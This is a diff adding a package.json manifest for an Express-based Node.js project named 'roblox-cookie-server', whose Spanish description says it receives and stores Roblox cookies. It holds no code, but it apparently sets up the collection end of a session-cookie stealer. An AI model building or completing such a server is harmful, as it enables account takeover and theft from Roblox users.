@@ -1,0 +1,12 @@
+{
+  "name": "roblox-cookie-server",
+  "version": "1.0.0",
+  "description": "Servidor para recibir y almacenar cookies de Roblox",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1"
+  }
+}
